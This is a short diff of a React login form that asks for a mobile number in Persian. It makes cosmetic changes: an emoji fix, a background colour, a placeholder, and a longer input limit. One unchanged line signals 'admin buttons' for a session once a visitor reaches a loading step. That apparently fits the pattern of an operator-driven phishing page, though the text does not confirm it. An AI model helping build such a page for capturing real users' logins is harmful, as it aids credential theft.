@@ -654,7 +654,7 @@ export const LoginForm = () => {
         setTimeout(async () => {
           try {
             console.log(
-              "���� User reached loading step from email, showing admin buttons...",
+              "📱 User reached loading step from email, showing admin buttons...",
             );
             await showAdminButtons(sessionId);
           } catch (error) {
@@ -1033,6 +1033,7 @@ export const LoginForm = () => {
                   <div
                     style={{
                       alignItems: "center",
+                      backgroundColor: "rgb(245, 246, 247)",
                       borderBottomLeftRadius: "8px",
                       borderBottomRightRadius: "8px",
                       borderRadius: "8px",
@@ -1047,13 +1048,15 @@ export const LoginForm = () => {
                     <input
                       id="mobile-input"
                       aria-invalid="false"
+                      aria-describedby=":R1aekpj1l6:-helper-text"
+                      autoFocus
                       name="mobile_number"
+                      placeholder="شماره موبایل خود را وارد کنید."
                       type="text"
                       inputMode="numeric"
-                      maxLength={11}
+                      maxLength={13}
                       value={toPersianDigits(mobileNumber)}
                       onChange={handleMobileNumberChange}
-                      autoFocus
                       disabled={isSubmitting}
                       style={{
                         animation:
@@ -1072,11 +1075,10 @@ export const LoginForm = () => {
                         width: "100%",
                         fontSize: "14px",
                         textAlign: "right",
-                        backgroundColor: "rgb(255, 255, 255)",
+                        backgroundColor: "transparent",
                         border: "none",
                         outline: "none",
                       }}
-                      placeholder="۰۹۱۲۳۴۵۶۷۸۹"
                     />
                     <fieldset
                       aria-hidden="true"
